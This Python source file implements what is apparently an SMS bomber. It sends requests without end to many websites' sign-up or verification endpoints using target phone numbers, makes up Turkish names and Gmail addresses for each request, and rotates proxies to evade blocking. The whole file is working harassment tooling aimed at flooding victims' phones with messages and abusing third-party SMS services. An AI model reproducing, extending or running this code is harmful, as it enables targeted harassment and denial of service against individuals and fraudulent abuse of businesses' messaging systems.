import requests
import random
import string
import time
import itertools
import json
import urllib3
from website_config import website_configs
from colorama import Fore, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

def random_turkish_name_surname_gmail():
    first_names = [
        'Alp', 'Aras', 'Ata', 'Aydin', 'Baran', 'Berk', 'Can', 'Cem', 'Deniz', 'Doruk',
        'Ege', 'Eren', 'Evren', 'Ilker', 'Kaan', 'Kerem', 'Koray', 'Mert', 'Metin', 'Murat',
        'Okan', 'Onur', 'Ozan', 'Polat', 'Sarp', 'Serkan', 'Sinan', 'Tarkan', 'Timur', 'Ufuk',
        'Ugur', 'Volkan', 'Yagiz', 'Yalin', 'Yavuz', 'Yigit', 'Zeki', 'Adil', 'Akin', 'Altan'
    ]
    
    last_names = [
        'Acar', 'Aksu', 'Aydin', 'Bilgin', 'Bulut', 'Cevik', 'Ciftci', 'Coskun', 'Demirci', 'Dincer',
        'Dogan', 'Erol', 'Gok', 'Gokce', 'Gokmen', 'Goktas', 'Guler', 'Gunes', 'Kahraman', 'Kilic',
        'Kose', 'Kurt', 'Ozcan', 'Ozel', 'Ozturk', 'Sari', 'Savas', 'Sezgin', 'Simsek', 'Soylu',
        'Tasci', 'Tekin', 'Tok', 'Tosun', 'Turan', 'Ucar', 'Uysal', 'Yalcin', 'Yavuz', 'Yildirim'
    ]

    first_name = random.choice(first_names)
    last_name = random.choice(last_names)

    #first_name, last_name, gmail = random_turkish_name_surname_gmail()

    def random_string(length):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    username = f"{first_name.lower()}{last_name.lower()}{random_string(4)}"
    gmail_address = f"{username}@gmail.com"
    return first_name, last_name, gmail_address

def shuffle_proxies(proxies):
    random.shuffle(proxies)
    return proxies

def get_next_proxy(proxy_iterator_container, proxies):
    try:
        return next(proxy_iterator_container[0])
    except StopIteration:
        shuffled_proxies = shuffle_proxies(proxies)
        proxy_iterator_container[0] = itertools.cycle(shuffled_proxies)  # Create a new cycle with the shuffled list
        return next(proxy_iterator_container[0])

def decompose_proxy_url(proxy_url, key):
    proxy_parts = {}

    if '@' in proxy_url:
        user_pass, ip_port = proxy_url.split('@')
        username, password = user_pass.split('//')[1].split(':')
        proxy_parts['username'] = username
        proxy_parts['password'] = password
    else:
        ip_port = proxy_url.split('//')[1]

    ip, port = ip_port.split(':')
    proxy_parts['ip'] = ip
    proxy_parts['port'] = port

    return proxy_parts.get(key)

def handle_response(response, success_criteria, failure_msg, response_base, developer_mode=False, proxy=False):
    if developer_mode:
        print(f"Response: {response.text}")
        print(f"Response status code: {response.status_code}")
        print(f"Proxy: {proxy}")
        
    # success_criteria and failure_msg could be a list or a string, ensure they are always lists of strings for consistency
    success_criteria = [str(criteria) for criteria in (success_criteria if isinstance(success_criteria, list) else [success_criteria])]
    if failure_msg:
        failure_msg = [str(msg) for msg in (failure_msg if isinstance(failure_msg, list) else [failure_msg])]
    
    if response_base == "text":
        check_attribute = response.text
        if any(criteria in check_attribute for criteria in success_criteria):
            if proxy:
                return True, True, 'successful'
            else:
                return True, 'successful'
        elif any(msg in check_attribute for msg in failure_msg):
            if proxy:
                return False, True, 'failure'
            else:
                return False, 'failure'
    elif response_base == "status":
        status_code = str(response.status_code)
        if developer_mode:
            print(f"Status Code: {status_code} Success Criteria: {success_criteria}")
        if status_code in success_criteria:
            if proxy:
                return True, True, 'successful'
            else:
                return True, 'successful'
        else:
            if proxy:
                return False, True, 'failure'
            else:
                return False, 'failure'

    # If no success or failure conditions matched, return 'unknown response'
    if proxy:
        return False, True, 'unknown response'
    else:
        return False, 'unknown response'
        
def handle_errors(developer_mode, e=None, proxy=None):
    if developer_mode: 
        print(f"Proxy: {proxy}")
    if isinstance(e, requests.exceptions.Timeout):
        if proxy:
            return False,False, 'response timeout'
        else:
            return False, 'response timeout'
    else:
        if developer_mode and e:
            print(f"Error: {str(e)}")
        if proxy:
            if developer_mode:
                print(f"Error testing proxy '{proxy}': {str(e)}")
            return False, False, 'exception'
        else:
            return False, 'exception'

def send_request(session, phone_number, first_name, last_name, gmail, config, developer_mode=False, proxy=False):
    values = {
        'first_name': first_name,
        'last_name': last_name,
        'gmail': gmail,
        'phone_number': phone_number
    }
    
    try:
        url = config['url']
        method = config.get('method', 'POST')  # Default to 'POST' if not specified

        payload_function = config['payload_function']
        payload = payload_function(first_name, last_name, gmail, phone_number)

        if config.get('send_as_json', False):
            payload = json.dumps(payload)  # Convert the payload to a JSON string if send_as_json is True

        headers = {}
        if config.get('send_with_headers', False):
            headers = config.get('headers', {})  # Get headers from config if send_with_headers is True
            if config.get('send_as_json', False):
                headers['Content-Type'] = 'application/json'  # Ensure the content type is set to JSON
        else:
            headers = None
        if config.get('send_with_cookies', False):
            cookies = config.get('cookies', {})
        else:
            cookies = None
        if config.get('response_base') in ["text", "status"]:
            response_base = config.get('response_base', {})
        else:
            print(f"{Fore.RED}response_base is not valid. Quiting..")
            return
        if proxy != "null":
            try:
                proxies = {'http': proxy,
                           'https': proxy
                        }
                if method.upper() == 'POST':
                    if headers and developer_mode:
                        print(headers) 
                    response = session.post(url, proxies=proxies, headers=headers if headers else None, cookies=cookies if cookies else None, data=payload, timeout=50, verify=False)
                elif method.upper() == 'GET':
                    response = session.get(url, proxies=proxies, headers=headers if headers else None, cookies=cookies if cookies else None, params=payload, timeout=50, verify=False)
                return handle_response(
                    response,
                    config['success'] if response_base == "text" else config['status_code'],
                    config['failure'] if response_base == "text" else False,
                    response_base,
                    developer_mode,
                    proxy
                )
            except Exception as e:
                return handle_errors(developer_mode, e, proxy)
        else:
            if method.upper() == 'POST':
                try:
                    if headers and developer_mode:
                        print(headers)
                    response = session.post(url, headers=headers if headers else None, cookies=cookies if cookies else None, data=payload, timeout=50, verify=False)
                except Exception as e:
                    return handle_errors(developer_mode, e)
            elif method.upper() == 'GET':
                try:
                    response = session.get(url, headers=headers if headers else None, cookies=cookies if cookies else None, params=payload, timeout=50, verify=False)
                except Exception as e:
                    return handle_errors(developer_mode, e)
            return handle_response(
                response,
                config['success'] if response_base == "text" else config['status_code'],
                config['failure'] if response_base == "text" else False,
                response_base,
                developer_mode,
                False
            )
    except Exception as e:
        if developer_mode:
            print(f"Error: {str(e)}")
        return False, False, 'exception'

def send_sms_requests(phone_numbers, http_proxies, https_proxies, developer_mode=False):
    total_successful_requests = 0
    total_failed_requests = 0
    total_unknown_requests = 0
    successful_requests = {phone_number: 0 for phone_number in phone_numbers}
    failed_requests = {phone_number: 0 for phone_number in phone_numbers}
    unknown_requests = {phone_number: 0 for phone_number in phone_numbers}
    iteration = 0

    proxies = False
    if len(http_proxies) > 0 or len(https_proxies) > 0:
        http_proxies = shuffle_proxies(http_proxies)
        https_proxies = shuffle_proxies(https_proxies)
        http_proxy_iterator = [itertools.cycle(http_proxies)]
        https_proxy_iterator = [itertools.cycle(https_proxies)]
        proxy_methods = {
            "http": (http_proxy_iterator, http_proxies),
            "https": (https_proxy_iterator, https_proxies),
        }
        proxies = True

    # Create session object
    session = requests.Session()

    start_time = time.time()  # Start time of the loop

    while True:
        iteration += 1
        for index, phone_number in enumerate(phone_numbers):
            first_name, last_name, gmail = random_turkish_name_surname_gmail()

            for website, config in website_configs.items():

                success = False
                success_request = False
                msg = ''
                proxy_used = None
                failure_count = 0  # Initialize failure count for each website
                if proxies:
                    url = config['url']
                    protocol = url.split('://', 1)[0]  # This will get "http" or "https" from the url
                    if protocol not in ["http", "https"]:
                        print(f'Error: protocol must be either "http" or "https". Found: {protocol}')
                        return
                    if protocol not in proxy_methods or len(proxy_methods[protocol][1]) == 0:
                        print(f"{Fore.RED}No {protocol.upper()} proxies available. Cannot send request to {website}.{Fore.RESET}")
                        continue
                    max_failures = min(5, len(proxy_methods[protocol][1]))
                    while not success_request and failure_count < max_failures:
                        proxy_used = get_next_proxy(proxy_methods[protocol][0], proxy_methods[protocol][1])
                        print(proxy_methods[protocol][1])
                        result = send_request(session, phone_number, first_name, last_name, gmail, config, developer_mode, proxy_used)
                        success, success_request, msg = result
                        if developer_mode:
                            print(result)
                        if not success_request:
                            print(f"{Fore.RED}Proxy {proxy_used} failed. Attempting with another proxy.{Fore.RESET}" if developer_mode else f"{Fore.RED}Proxy {decompose_proxy_url(proxy_used, 'ip')} failed. Attempting with another proxy.{Fore.RESET}")
                            failure_count += 1  # Increment failure count on failure
                    if failure_count == max_failures and max_failures > 1:
                        print(f"{Fore.RED}Failed to establish a connection to {website} despite attempting with {max_failures} different proxies. Moving on to next website.{Fore.RESET}")
                        continue  # continue to the next website

                    elif failure_count == max_failures:
                        print(f"{Fore.RED}Failed to establish a connection to {website} using {decompose_proxy_url(proxy_used, 'ip')} Proxy. Moving on to next website.{Fore.RESET}")
                        continue  # continue to the next website

                if not proxies:
                    result = send_request(session, phone_number, first_name, last_name, gmail, config, developer_mode, False)
                    if developer_mode:
                        print(result)
                    success, msg = result
                else:
                    proxy_used = decompose_proxy_url(proxy_used, 'ip')

                if success:
                    successful_requests[phone_number] += 1
                    total_successful_requests += 1
                    print(f"{Fore.CYAN}[{website}]{Fore.GREEN} Request is successfull for number {index + 1}/{len(phone_numbers)} ({phone_number}) using the {proxy_used} proxy.")
                elif not success:
                    if msg == 'unknown response':
                        unknown_requests[phone_number] += 1
                        total_unknown_requests += 1
                        print(f"{Fore.CYAN}[{website}]{Fore.YELLOW} Request is unknown for number {index + 1}/{len(phone_numbers)} ({phone_number}) using the {proxy_used} proxy.")
                    else:
                        failed_requests[phone_number] += 1
                        total_failed_requests += 1
                        if not msg == 'response timeout':
                            print(f"{Fore.CYAN}[{website}]{Fore.RED} Request is unsuccessfull for number {index + 1}/{len(phone_numbers)} ({phone_number}) using the {proxy_used} proxy.")
                        else:
                            print(f"{Fore.RED}Failed to establish a connection to {website}. Moving on to next website.{Fore.RESET}")
                if developer_mode:
                    print(f"msg: {msg}")

            print(f"{Fore.BLUE}Loop: {iteration} | Total successful requests: {total_successful_requests} | Total failed requests: {total_failed_requests} | Total unknown requests: {total_unknown_requests}")